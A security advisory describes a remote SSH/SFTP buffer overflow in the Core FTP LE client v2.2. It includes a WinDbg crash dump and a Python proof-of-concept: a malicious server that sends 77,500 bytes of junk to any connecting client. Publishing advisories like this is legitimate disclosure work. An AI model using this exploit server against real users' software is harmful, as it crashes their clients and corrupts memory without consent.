[+] Credits: John Page aka hyp3rlinx

[+] Website: hyp3rlinx.altervista.org

[+] Source: http://hyp3rlinx.altervista.org/advisories/CORE-FTP-REMOTE-SSH-SFTP-BUFFER-OVERFLOW.txt

[+] ISR: ApparitionSec



Vendor:
===============
www.coreftp.com



Product:
========================
Core FTP LE (client)
v2.2 build 1883

Core FTP LE - free Windows software that includes the client FTP features
you need. Features like SFTP (SSH), SSL, TLS, FTPS, IDN,
browser integration, site to site transfers, FTP transfer resume, drag and
drop support, file viewing & editing, firewall support,
custom commands, FTP URL parsing, command line transfers, filters, and
much, much more.



Vulnerability Type:
================================
Remote SSH/SFTP Buffer Overflow



CVE Reference:
==============
N/A



Vulnerability Details:
=====================

Core FTP client is vulnerable to remote buffer overflow denial of service
when connecting to a malicious server using
SSH/SFTP protocol.

Upon receiving an overly long string of junk from the malicious FTP server
response, Core FTP crashes and the stack
is corrupted with several registers EBX, EDX, EDI being overwritten as can
be seen below.

WinDbg dump...

(d9c.16d8): Access violation - code c0000005 (first/second chance not
available)
eax=035b0000 ebx=00004141 ecx=03ac7e40 edx=41414141 esi=03ac7e38
edi=41414141
eip=77313ac3 esp=0439fa10 ebp=0439fae0 iopl=0         nv up ei pl nz ac pe
nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b
efl=00010216
ntdll!RtlImageNtHeader+0x92f:
77313ac3 8b12            mov     edx,dword ptr [edx]
 ds:002b:41414141=????????




Exploit code(s):
===============

import socket

print 'hyp3rlinx - Apparition Security'
print 'Core FTP SSH/SFTP Remote Buffer Overflow / DOS\r\n'
host='127.0.0.1'

port = 22
s = socket.socket()

payload="A"*77500
s.bind((host, port))
s.listen(5)

print 'Listening on port... %i' %port
print 'Connect to me!'

while True:
    conn, addr = s.accept()
    conn.send(payload+'\r\n')
    conn.close()



Exploitation Technique:
=======================
Remote



Severity Level:
===============
High




[+] Disclaimer
The information contained within this advisory is supplied "as-is" with no
warranties or guarantees of fitness of use or otherwise.
Permission is hereby granted for the redistribution of this advisory,
provided that it is not altered except by reformatting it, and
that due credit is given. Permission is explicitly given for insertion in
vulnerability databases and similar, provided that due credit
is given to the author. The author is not responsible for any misuse of the
information contained herein and accepts no responsibility
for any damage caused by the use or misuse of this information. The author
prohibits any malicious use of security related information
or exploits by the author or elsewhere.

hyp3rlinx